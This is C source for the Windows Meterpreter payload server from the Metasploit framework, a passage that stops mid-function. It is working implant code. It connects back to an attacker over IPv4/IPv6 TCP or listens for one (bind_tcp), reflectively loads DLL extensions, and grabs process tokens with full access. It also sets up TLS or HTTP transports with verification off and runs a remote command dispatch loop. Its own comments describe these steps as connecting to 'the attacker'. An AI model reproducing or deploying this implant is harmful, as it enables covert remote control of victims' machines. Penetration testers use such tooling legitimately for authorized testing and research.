/*!
 * @file server_setup.c
 */
#include "metsrv.h"
#include "../../common/common.h"
#include <ws2tcpip.h>

// These fields aren't defined unless the SDK version is set to something old enough.
// So we define them here instead of dancing with SDK versions, allowing us to move on
// and still support older versions of Windows.
#ifndef IPPROTO_IPV6
#define IPPROTO_IPV6 41
#endif
#ifndef in6addr_any
extern IN6_ADDR in6addr_any;
#endif

/*!
 * @file server_setup.c
 */
#include "metsrv.h"
#include "../../common/common.h"
#include <ws2tcpip.h>

#include "win/server_setup_winhttp.h"

BOOL configure_tcp_connection(Remote* remote, SOCKET socket);

extern Command* extensionCommands;

wchar_t* global_meterpreter_transport = L"METERPRETER_TRANSPORT_SSL\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
wchar_t* global_meterpreter_url = L"https://XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX/\x00";
wchar_t* global_meterpreter_ua = L"METERPRETER_UA\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
wchar_t* global_meterpreter_proxy = L"METERPRETER_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
wchar_t* global_meterpreter_proxy_username = L"METERPRETER_USERNAME_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
wchar_t* global_meterpreter_proxy_password = L"METERPRETER_PASSWORD_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
PBYTE global_meterpreter_ssl_cert_hash = "METERPRETER_SSL_CERT_HASH\x00";
int global_expiration_timeout = 0xb64be661;
int global_comm_timeout       = 0xaf79257f;

/*! @brief Number of milliseconds to wait before connection retries. */
const DWORD RETRY_TIMEOUT_MS = 1000;

#include <windows.h> // for EXCEPTION_ACCESS_VIOLATION
#include <excpt.h>

// NOTE: _CRT_SECURE_NO_WARNINGS has been added to Configuration->C/C++->Preprocessor->Preprocessor

// include the Reflectiveloader() function
#include "../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"

int exceptionfilter(unsigned int code, struct _EXCEPTION_POINTERS *ep)
{
	return EXCEPTION_EXECUTE_HANDLER;
}

#define InitAppInstance() { if( hAppInstance == NULL ) hAppInstance = GetModuleHandle( NULL ); }

#define PREPEND_ERROR "### Error: "
#define PREPEND_INFO  "### Info : "
#define PREPEND_WARN  "### Warn : "

/*! @brief An array of locks for use by OpenSSL. */
static LOCK ** ssl_locks = NULL;

/*!
 * @brief Connects to a provided host/port (IPv4), downloads a payload and executes it.
 * @param host String containing the name or IP of the host to connect to.
 * @param port Port number to connect to.
 * @param retryAttempts The number of times to attempt to retry.
 */
DWORD reverse_tcp4(const char* host, u_short port, short retryAttempts, SOCKET* socketBuffer)
{
	*socketBuffer = 0;

	// start by attempting to fire up Winsock.
	WSADATA wsaData = { 0 };
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
	{
		return WSAGetLastError();
	}

	// prepare to connect to the attacker
	SOCKET socketHandle = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	struct hostent* target = gethostbyname(host);
	char* targetIp = inet_ntoa(*(struct in_addr *)*target->h_addr_list);

	SOCKADDR_IN sock = { 0 };
	sock.sin_addr.s_addr = inet_addr(targetIp);
	sock.sin_family = AF_INET;
	sock.sin_port = htons(port);

	// try connect to the attacker at least once
	while (connect(socketHandle, (SOCKADDR*)&sock, sizeof(sock)) == SOCKET_ERROR)
	{
		// retry with a sleep if it fails, or exit the process on failure
		if (retryAttempts-- <= 0)
		{
			return WSAGetLastError();
		}

		Sleep(RETRY_TIMEOUT_MS);
	}

	*socketBuffer = socketHandle;

	return ERROR_SUCCESS;
}

/*!
 * @brief Connects to a provided host/port (IPv6), downloads a payload and executes it.
 * @param host String containing the name or IP of the host to connect to.
 * @param service The target service/port.
 * @param scopeId IPv6 scope ID.
 * @param retryAttempts The number of times to attempt to retry.
 */
DWORD reverse_tcp6(const char* host, const char* service, ULONG scopeId, short retryAttempts, SOCKET* socketBuffer)
{
	*socketBuffer = 0;

	// start by attempting to fire up Winsock.
	WSADATA wsaData = { 0 };
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
	{
		return WSAGetLastError();
	}

	ADDRINFO hints = { 0 };
	hints.ai_family = AF_INET6;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	LPADDRINFO addresses;
	if (getaddrinfo(host, service, &hints, &addresses) != 0)
	{
		return WSAGetLastError();
	}


	// prepare to connect to the attacker
	SOCKET socketHandle = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);

	if (socketHandle == INVALID_SOCKET)
	{
		dprintf("[STAGELESS IPV6] failed to connect to attacker");
		return WSAGetLastError();
	}

	dprintf("[STAGELESS IPV6] Socket successfully created");
	while (retryAttempts-- > 0)
	{
		dprintf("[STAGELESS IPV6] Attempt %u", retryAttempts + 1);
		for (LPADDRINFO address = addresses; address != NULL; address = address->ai_next)
		{
			((LPSOCKADDR_IN6)address->ai_addr)->sin6_scope_id = scopeId;

			if (connect(socketHandle, address->ai_addr, (int)address->ai_addrlen) != SOCKET_ERROR)
			{
				dprintf("[STAGELESS IPV6] Socket successfully connected");
				*socketBuffer = socketHandle;
				freeaddrinfo(addresses);
				return ERROR_SUCCESS;
			}
		}

		Sleep(RETRY_TIMEOUT_MS);
	}

	closesocket(socketHandle);
	freeaddrinfo(addresses);
	return WSAGetLastError();

}

/*!
 * @brief Listens on a port for an incoming payload request.
 * @param port Port number to listen on.
 */
DWORD bind_tcp(u_short port, SOCKET* socketBuffer)
{
	*socketBuffer = 0;

	// start by attempting to fire up Winsock.
	WSADATA wsaData = { 0 };
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
	{
		return WSAGetLastError();
	}


	// prepare a connection listener for the attacker to connect to, and we
	// attempt to bind to both ipv6 and ipv4 by default, and fallback to ipv4
	// only if the process fails.
	BOOL v4Fallback = FALSE;
	SOCKET listenSocket = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);

	if (listenSocket == INVALID_SOCKET)
	{
		dprintf("[BIND] Unable to create IPv6 socket");
		v4Fallback = TRUE;
	}
	else
	{
		int no = 0;
		if (setsockopt(listenSocket, IPPROTO_IPV6, IPV6_V6ONLY, (char*)&no, sizeof(no)) == SOCKET_ERROR)
		{
			// fallback to ipv4 - we're probably running on Windows XP or earlier here, which means that to
			// support IPv4 and IPv6 we'd need to create two separate sockets. IPv6 on XP isn't that common
			// so instead, we'll just revert back to v4 and listen on that one address instead.
			dprintf("[BIND] Unable to remove IPV6_ONLY option");
			closesocket(listenSocket);
			v4Fallback = TRUE;
		}
	}

	if (v4Fallback)
	{
		dprintf("[BIND] Falling back to IPV4");
		listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	}

	struct sockaddr_in6 sockAddr = { 0 };

	if (v4Fallback)
	{
		struct sockaddr_in* v4Addr = (struct sockaddr_in*)&sockAddr;
		v4Addr->sin_addr.s_addr = htons(INADDR_ANY);
		v4Addr->sin_family = AF_INET;
		v4Addr->sin_port = htons(port);
	}
	else
	{
		sockAddr.sin6_addr = in6addr_any;
		sockAddr.sin6_family = AF_INET6;
		sockAddr.sin6_port = htons(port);
	}

	if (bind(listenSocket, (SOCKADDR *)&sockAddr, (v4Fallback ? sizeof(struct sockaddr_in) : sizeof(struct sockaddr_in6))) == SOCKET_ERROR)
	{
		return WSAGetLastError();
	}

	if (listen(listenSocket, 1) == SOCKET_ERROR)
	{
		return WSAGetLastError();
	}

	// Setup, ready to go, now wait for the connection.
	SOCKET acceptSocket = accept(listenSocket, NULL, NULL);

	// don't bother listening for other connections
	closesocket(listenSocket);

	if (acceptSocket == INVALID_SOCKET)
	{
		return WSAGetLastError();
	}

	*socketBuffer = acceptSocket;
	return ERROR_SUCCESS;
}

/*!
 * @brief A callback function used by OpenSSL to leverage native system locks.
 * @param mode The lock mode to set.
 * @param type The lock type to operate on.
 * @param file Unused.
 * @param line Unused.
 */
static VOID server_locking_callback(int mode, int type, const char * file, int line)
{
	if (mode & CRYPTO_LOCK)
	{
		lock_acquire(ssl_locks[type]);
	}
	else
	{
		lock_release(ssl_locks[type]);
	}
}

/*!
 * @brief A callback function used by OpenSSL to get the current threads id.
 * @returns The current thread ID.
 * @remarks While not needed on windows this must be used for posix meterpreter.
 */
static long unsigned int server_threadid_callback(VOID)
{
	return GetCurrentThreadId();
}

/*!
 * @brief A callback function for dynamic lock creation for OpenSSL.
 * @returns A pointer to a lock that can be used for synchronisation.
 * @param file _Ignored_
 * @param line _Ignored_
 */
static struct CRYPTO_dynlock_value* server_dynamiclock_create(const char * file, int line)
{
	return (struct CRYPTO_dynlock_value*)lock_create();
}

/*!
 * @brief A callback function for dynamic lock locking for OpenSSL.
 * @param mode A bitmask which indicates the lock mode.
 * @param l A point to the lock instance.
 * @param file _Ignored_
 * @param line _Ignored_
 */
static void server_dynamiclock_lock(int mode, struct CRYPTO_dynlock_value* l, const char* file, int line)
{
	LOCK * lock = (LOCK *)l;

	if (mode & CRYPTO_LOCK)
	{
		lock_acquire(lock);
	}
	else
	{
		lock_release(lock);
	}
}

/*!
 * @brief A callback function for dynamic lock destruction for OpenSSL.
 * @param l A point to the lock instance.
 * @param file _Ignored_
 * @param line _Ignored_
 */
static void server_dynamiclock_destroy(struct CRYPTO_dynlock_value* l, const char * file, int line)
{
	lock_destroy((LOCK *)l);
}

/*!
 * @brief Flush all pending data on the connected socket before doing SSL.
 * @param remote Pointer to the remote instance.
 */
static VOID server_socket_flush(Remote* remote)
{
	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
	fd_set fdread;
	DWORD ret;
	char buff[4096];

	lock_acquire(remote->lock);

	while (1)
	{
		struct timeval tv;
		LONG data;

		FD_ZERO(&fdread);
		FD_SET(ctx->fd, &fdread);

		// Wait for up to one second for any errant socket data to appear
		tv.tv_sec = 1;
		tv.tv_usec = 0;

		data = select((int)ctx->fd + 1, &fdread, NULL, NULL, &tv);
		if (data == 0)
		{
			break;
		}

		ret = recv(ctx->fd, buff, sizeof(buff), 0);
		dprintf("[SERVER] Flushed %d bytes from the buffer", ret);

		// The socket closed while we waited
		if (ret == 0)
		{
			break;
		}
		continue;
	}

	lock_release(remote->lock);
}

/*!
 * @brief Poll a socket for data to recv and block when none available.
 * @param remote Pointer to the remote instance.
 * @param timeout Amount of time to wait before the poll times out.
 */
static LONG server_socket_poll(Remote * remote, long timeout)
{
	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
	struct timeval tv;
	LONG result;
	fd_set fdread;

	lock_acquire(remote->lock);

	FD_ZERO(&fdread);
	FD_SET(ctx->fd, &fdread);

	tv.tv_sec = 0;
	tv.tv_usec = timeout;

	result = select((int)ctx->fd + 1, &fdread, NULL, NULL, &tv);

	lock_release(remote->lock);

	return result;
}

/*!
 * @brief Initialize the OpenSSL subsystem for use in a multi threaded enviroment.
 * @param remote Pointer to the remote instance.
 */
static BOOL server_initialize_ssl(Remote * remote)
{
	int i = 0;

	lock_acquire(remote->lock);

	// Begin to bring up the OpenSSL subsystem...
	CRYPTO_malloc_init();
	SSL_load_error_strings();
	SSL_library_init();

	// Setup the required OpenSSL multi-threaded enviroment...
	ssl_locks = (LOCK**)malloc(CRYPTO_num_locks() * sizeof(LOCK *));
	if (ssl_locks == NULL)
	{
		lock_release(remote->lock);
		return FALSE;
	}

	for (i = 0; i < CRYPTO_num_locks(); i++)
	{
		ssl_locks[i] = lock_create();
	}

	CRYPTO_set_id_callback(server_threadid_callback);
	CRYPTO_set_locking_callback(server_locking_callback);
	CRYPTO_set_dynlock_create_callback(server_dynamiclock_create);
	CRYPTO_set_dynlock_lock_callback(server_dynamiclock_lock);
	CRYPTO_set_dynlock_destroy_callback(server_dynamiclock_destroy);

	lock_release(remote->lock);

	return TRUE;
}

/*!
 * @brief Bring down the OpenSSL subsystem
 * @return Indication of success or failure.
 * @param remote Pointer to the remote instance.
 */
static BOOL server_destroy_ssl(Remote* remote)
{
	TcpTransportContext* ctx = NULL;
	int i = 0;

	if (remote == NULL || remote->transport == NULL || remote->transport->ctx == NULL)
	{
		return FALSE;
	}

	ctx = (TcpTransportContext*)remote->transport->ctx;

	dprintf("[SERVER] Destroying SSL");

	lock_acquire(remote->lock);

	SSL_free(ctx->ssl);

	SSL_CTX_free(ctx->ctx);

	CRYPTO_set_locking_callback(NULL);
	CRYPTO_set_id_callback(NULL);
	CRYPTO_set_dynlock_create_callback(NULL);
	CRYPTO_set_dynlock_lock_callback(NULL);
	CRYPTO_set_dynlock_destroy_callback(NULL);

	for (i = 0; i < CRYPTO_num_locks(); i++)
	{
		lock_destroy(ssl_locks[i]);
	}

	free(ssl_locks);

	lock_release(remote->lock);

	return TRUE;
}

/*!
 * @brief Negotiate SSL on the socket.
 * @return Indication of success or failure.
 * @param remote Pointer to the remote instance.
 */
static BOOL server_negotiate_ssl(Remote *remote)
{
	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
	BOOL success = TRUE;
	SOCKET fd = 0;
	DWORD ret = 0;
	DWORD res = 0;

	lock_acquire(remote->lock);

	do
	{
		ctx->meth = TLSv1_client_method();

		ctx->ctx = SSL_CTX_new(ctx->meth);
		SSL_CTX_set_mode(ctx->ctx, SSL_MODE_AUTO_RETRY);

		ctx->ssl = SSL_new(ctx->ctx);
		SSL_set_verify(ctx->ssl, SSL_VERIFY_NONE, NULL);

		if (SSL_set_fd(ctx->ssl, (int)ctx->fd) == 0)
		{
			dprintf("[SERVER] set fd failed");
			success = FALSE;
			break;
		}

		do
		{
			if ((ret = SSL_connect(ctx->ssl)) != 1)
			{
				res = SSL_get_error(ctx->ssl, ret);
				dprintf("[SERVER] connect failed %d\n", res);

				if (res == SSL_ERROR_WANT_READ || res == SSL_ERROR_WANT_WRITE)
				{
					// Catch non-blocking socket errors and retry
					continue;
				}

				success = FALSE;
				break;
			}
		} while (ret != 1);

		if (success == FALSE) break;

		dprintf("[SERVER] Sending a HTTP GET request to the remote side...");

		if ((ret = SSL_write(ctx->ssl, "GET /123456789 HTTP/1.0\r\n\r\n", 27)) <= 0)
		{
			dprintf("[SERVER] SSL write failed during negotiation with return: %d (%d)", ret, SSL_get_error(ctx->ssl, ret));
		}

	} while (0);

	lock_release(remote->lock);

	dprintf("[SERVER] Completed writing the HTTP GET request: %d", ret);

	if (ret < 0)
	{
		success = FALSE;
	}

	return success;
}

/*!
 * @brief The servers main dispatch loop for incoming requests using SSL over TCP
 * @param remote Pointer to the remote endpoint for this server connection.
 * @returns Indication of success or failure.
 */
static DWORD server_dispatch(Remote* remote, THREAD* dispatchThread)
{
	BOOL running = TRUE;
	LONG result = ERROR_SUCCESS;
	Packet * packet = NULL;
	THREAD * cpt = NULL;

	dprintf("[DISPATCH] entering server_dispatch( 0x%08X )", remote);

	// Bring up the scheduler subsystem.
	result = scheduler_initialize(remote);
	if (result != ERROR_SUCCESS)
	{
		return result;
	}

	while (running)
	{
		if (event_poll(dispatchThread->sigterm, 0))
		{
			dprintf("[DISPATCH] server dispatch thread signaled to terminate...");
			break;
		}

		result = server_socket_poll(remote, 100);
		if (result > 0)
		{
			result = remote->transport->packet_receive(remote, &packet);
			if (result != ERROR_SUCCESS)
			{
				dprintf("[DISPATCH] packet_receive returned %d, exiting dispatcher...", result);
				break;
			}

			running = command_handle(remote, packet);
			dprintf("[DISPATCH] command_process result: %s", (running ? "continue" : "stop"));
		}
		else if (result < 0)
		{
			dprintf("[DISPATCH] server_socket_poll returned %d, exiting dispatcher...", result);
			break;
		}
	}

	dprintf("[DISPATCH] calling scheduler_destroy...");
	scheduler_destroy();

	dprintf("[DISPATCH] calling command_join_threads...");
	command_join_threads();

	dprintf("[DISPATCH] leaving server_dispatch.");

	return result;
}

/*
 * Get the session id that this meterpreter server is running in.
 */
DWORD server_sessionid()
{
	typedef BOOL (WINAPI * PROCESSIDTOSESSIONID)( DWORD pid, LPDWORD id );

	static PROCESSIDTOSESSIONID pProcessIdToSessionId = NULL;
	HMODULE hKernel   = NULL;
	DWORD dwSessionId = 0;

	do
	{
		if (!pProcessIdToSessionId)
		{
			hKernel = LoadLibraryA("kernel32.dll");
			if (hKernel)
			{
				pProcessIdToSessionId = (PROCESSIDTOSESSIONID)GetProcAddress(hKernel, "ProcessIdToSessionId");
			}
		}

		if (!pProcessIdToSessionId)
		{
			break;
		}

		if (!pProcessIdToSessionId(GetCurrentProcessId(), &dwSessionId))
		{
			dwSessionId = -1;
		}

	} while( 0 );

	if (hKernel)
	{
		FreeLibrary(hKernel);
	}

	return dwSessionId;
}

VOID load_stageless_extensions(Remote* pRemote, ULONG_PTR fd)
{
	LPBYTE pExtensionStart = (LPBYTE)fd + sizeof(DWORD);
	DWORD size = *((LPDWORD)(pExtensionStart - sizeof(DWORD)));

	while (size > 0)
	{
		dprintf("[SERVER] Extension located at 0x%p: %u bytes", pExtensionStart, size);
		HMODULE hLibrary = LoadLibraryR(pExtensionStart, size);
		dprintf("[SERVER] Extension located at 0x%p: %u bytes loaded to %x", pExtensionStart, size, hLibrary);
		initialise_extension(hLibrary, TRUE, pRemote, NULL, extensionCommands);

		pExtensionStart += size + sizeof(DWORD);
		size = *((LPDWORD)(pExtensionStart - sizeof(DWORD)));
	}

	dprintf("[SERVER] All stageless extensions loaded");
}

SOCKET tcp_transport_get_socket(Transport* transport)
{
	return ((TcpTransportContext*)transport->ctx)->fd;
}

void transport_destroy_tcp(Remote* remote)
{
	if (remote && remote->transport)
	{
		dprintf("[TRANS TCP] Destroying tcp transport for url %S", remote->transport->url);
		SAFE_FREE(remote->transport->url);
		SAFE_FREE(remote->transport);
	}
}

Transport* transport_create_tcp(wchar_t* url)
{
	Transport* transport = (Transport*)malloc(sizeof(Transport));
	TcpTransportContext* ctx = (TcpTransportContext*)malloc(sizeof(TcpTransportContext));

	dprintf("[TRANS TCP] Creating tcp transport for url %S", url);

	memset(transport, 0, sizeof(Transport));
	memset(ctx, 0, sizeof(TcpTransportContext));

	transport->url = _wcsdup(url);
	transport->packet_receive = packet_receive_via_ssl;
	transport->packet_transmit = packet_transmit_via_ssl;
	transport->transport_init = configure_tcp_connection;
	transport->transport_deinit = server_destroy_ssl;
	transport->transport_destroy = transport_destroy_tcp;
	transport->server_dispatch = server_dispatch;
	transport->get_socket = tcp_transport_get_socket;
	transport->ctx = ctx;
	transport->type = METERPRETER_TRANSPORT_SSL;

	return transport;
}

void transport_destroy_http(Remote* remote)
{
	if (remote && remote->transport)
	{
		HttpTransportContext* ctx = (HttpTransportContext*)remote->transport->ctx;

		dprintf("[TRANS HTTP] Destroying http transport for url %S", remote->transport->url);

		SAFE_FREE(remote->transport->url);
		SAFE_FREE(ctx->cert_hash);
		SAFE_FREE(ctx->proxy);
		SAFE_FREE(ctx->proxy_pass);
		SAFE_FREE(ctx->proxy_user);
		SAFE_FREE(ctx->ua);
		SAFE_FREE(ctx->uri);
		SAFE_FREE(remote->transport);
	}
}

Transport* transport_create_http(BOOL ssl, wchar_t* url, wchar_t* ua, wchar_t* proxy,
	wchar_t* proxyUser, wchar_t* proxyPass, PBYTE certHash, int expirationTime, int commsTimeout)
{
	Transport* transport = (Transport*)malloc(sizeof(Transport));
	HttpTransportContext* ctx = (HttpTransportContext*)malloc(sizeof(HttpTransportContext));

	dprintf("[TRANS HTTP] Creating http transport for url %S", url);

	memset(transport, 0, sizeof(Transport));
	memset(ctx, 0, sizeof(HttpTransportContext));

	if (expirationTime > 0)
	{
		ctx->expiration_time = current_unix_timestamp() + expirationTime;
	}

	ctx->comm_timeout = commsTimeout;
	ctx->start_time = current_unix_timestamp();
	ctx->comm_last_packet = current_unix_timestamp();

	if (ua)
	{
		ctx->ua = _wcsdup(ua);
	}
	if (proxy && wcscmp(proxy, L"METERPRETER_PROXY") != 0)
	{
		ctx->proxy = _wcsdup(proxy);
	}
	if (proxyUser && wcscmp(proxyUser, L"METERPRETER_USERNAME_PROXY") != 0)
	{
		ctx->proxy_user = _wcsdup(proxyUser);
	}
	if (proxyPass && wcscmp(proxyPass, L"METERPRETER_PASSWORD_PROXY") != 0)
	{
		ctx->proxy_pass = _wcsdup(proxyPass);
	}
	ctx->ssl = ssl;

	// only apply the cert hash if we're given one and it's not the global value
	if (certHash && strncmp((char*)certHash, "METERPRETER_SSL_CERT_HASH", 20) != 0)
	{
		ctx->cert_hash = (PBYTE)malloc(sizeof(BYTE) * 20);
		memcpy(ctx->cert_hash, certHash, 20);
	}

	transport->url = _wcsdup(url);
	transport->packet_receive = packet_receive_via_http;
	transport->packet_transmit = packet_transmit_via_http;
	transport->server_dispatch = server_dispatch_http_winhttp;
	transport->transport_init = server_init_http_winhttp;
	transport->transport_deinit = server_deinit_http_winhttp;
	transport->transport_destroy = transport_destroy_http;
	transport->ctx = ctx;
	transport->type = ssl ? METERPRETER_TRANSPORT_HTTPS : METERPRETER_TRANSPORT_HTTP;

#ifdef DEBUGTRACE
	if (ssl && certHash)
	{
		PBYTE hash = certHash;
		dprintf("[SERVER] Using HTTPS transport: Hash set to: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
			hash[0], hash[1], hash[2], hash[3], hash[4], hash[5], hash[6], hash[7], hash[8], hash[9], hash[10],
			hash[11], hash[12], hash[13], hash[14], hash[15], hash[16], hash[17], hash[18], hash[19]);
		dprintf("[SERVER] is validating hashes %p", hash);
	}
#endif

	return transport;
}

Transport* transport_create(wchar_t* transport, wchar_t* url)
{
	Transport* t = NULL;
	dprintf("[TRANSPORT] Type = %S", transport);
	dprintf("[TRANSPORT] URL = %S", url);

	if (wcscmp(transport, L"TRANSPORT_SSL") == 0)
	{
		t = transport_create_tcp(url);
	}
	else
	{
		BOOL ssl = wcscmp(transport, L"TRANSPORT_HTTPS") == 0;
		t = transport_create_http(ssl, url, global_meterpreter_ua, global_meterpreter_proxy, global_meterpreter_proxy_username,
			global_meterpreter_proxy_password, global_meterpreter_ssl_cert_hash, global_expiration_timeout, global_comm_timeout);
	}

	return t;
}

/*
 * Setup and run the server. This is called from Init via the loader.
 */
DWORD server_setup(SOCKET fd)
{
	THREAD* serverThread = NULL;
	Remote* pRemote = NULL;
	char cStationName[256] = { 0 };
	char cDesktopName[256] = { 0 };
	DWORD res = 0;

	// first byte of the URL indites 's' if it's stageless
	BOOL bStageless = global_meterpreter_url[0] == 's';

	dprintf("[SERVER] Initializing...");

	// if hAppInstance is still == NULL it means that we havent been
	// reflectivly loaded so we must patch in the hAppInstance value
	// for use with loading server extensions later.
	InitAppInstance();

	srand((unsigned int)time(NULL));

	__try
	{
		do
		{
			dprintf("[SERVER] module loaded at 0x%08X", hAppInstance);

			// Open a THREAD item for the servers main thread, we use this to manage migration later.
			serverThread = thread_open();

			dprintf("[SERVER] main server thread: handle=0x%08X id=0x%08X sigterm=0x%08X", serverThread->handle, serverThread->id, serverThread->sigterm);

			if (!(pRemote = remote_allocate()))
			{
				SetLastError(ERROR_NOT_ENOUGH_MEMORY);
				break;
			}

			// Store our thread handle
			pRemote->hServerThread = serverThread->handle;

			// Store our process token
			if (!OpenThreadToken(pRemote->hServerThread, TOKEN_ALL_ACCESS, TRUE, &pRemote->hServerToken))
			{
				OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &pRemote->hServerToken);
			}

			// Copy it to the thread token
			pRemote->hThreadToken = pRemote->hServerToken;

			// Save the initial session/station/desktop names...
			pRemote->dwOrigSessionId = server_sessionid();
			pRemote->dwCurrentSessionId = pRemote->dwOrigSessionId;
			GetUserObjectInformation(GetProcessWindowStation(), UOI_NAME, &cStationName, 256, NULL);
			pRemote->cpOrigStationName = _strdup(cStationName);
			pRemote->cpCurrentStationName = _strdup(cStationName);
			GetUserObjectInformation(GetThreadDesktop(GetCurrentThreadId()), UOI_NAME, &cDesktopName, 256, NULL);
			pRemote->cpOrigDesktopName = _strdup(cDesktopName);
			pRemote->cpCurrentDesktopName = _strdup(cDesktopName);

			dprintf("[SERVER] Registering dispatch routines...");
			register_dispatch_routines();

			if (bStageless)
			{
				// in the case of stageless payloads, fd contains a pointer to the extensions
				// to load
				dprintf("[SERVER] Loading stageless extensions");
				load_stageless_extensions(pRemote, (ULONG_PTR)fd);
			}

			// allocate the "next transport" information
			dprintf("[SERVER] creating transport");
			pRemote->nextTransport = transport_create(global_meterpreter_transport + 12, global_meterpreter_url + (bStageless ? 1 : 0));

			while (pRemote->nextTransport)
			{
				pRemote->transport = pRemote->nextTransport;
				pRemote->nextTransport = NULL;

				dprintf("[SERVER] initialising transport 0x%p", pRemote->transport->transport_init);
				if (pRemote->transport->transport_init && !pRemote->transport->transport_init(pRemote, fd))
				{
					break;
				}

				dprintf("[SERVER] Entering the main server dispatch loop for transport %x, context %x", pRemote->transport, pRemote->transport->ctx);
				pRemote->transport->server_dispatch(pRemote, serverThread);

				if (pRemote->transport->transport_deinit)
				{
					pRemote->transport->transport_deinit(pRemote);
				}

				pRemote->transport->transport_destroy(pRemote);
			}

			dprintf("[SERVER] Deregistering dispatch routines...");
			deregister_dispatch_routines(pRemote);
		} while (0);

		remote_deallocate(pRemote);
	}
	__except (exceptionfilter(GetExceptionCode(), GetExceptionInformation()))
	{
		dprintf("[SERVER] *** exception triggered!");

		thread_kill(serverThread);
	}

	dprintf("[SERVER] Finished.");
	return res;
}

BOOL configure_tcp_connection(Remote* remote, SOCKET socket)
{
	DWORD result = ERROR_SUCCESS;
	size_t charsConverted;
	char asciiUrl[512];
	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;

	wcstombs_s(&charsConverted, asciiUrl, sizeof(asciiUrl), remote->transport->url, sizeof(asciiUrl)-1);

	if (strncmp(asciiUrl, "tcp", 3) == 0)
	{
		const int iRetryAttempts = 30;
		char* pHost = strstr(asciiUrl, "//") + 2;
		char* pPort = strrchr(pHost, ':') + 1;

		// check if we're using IPv6
		if (asciiUrl[3] == '6')
		{
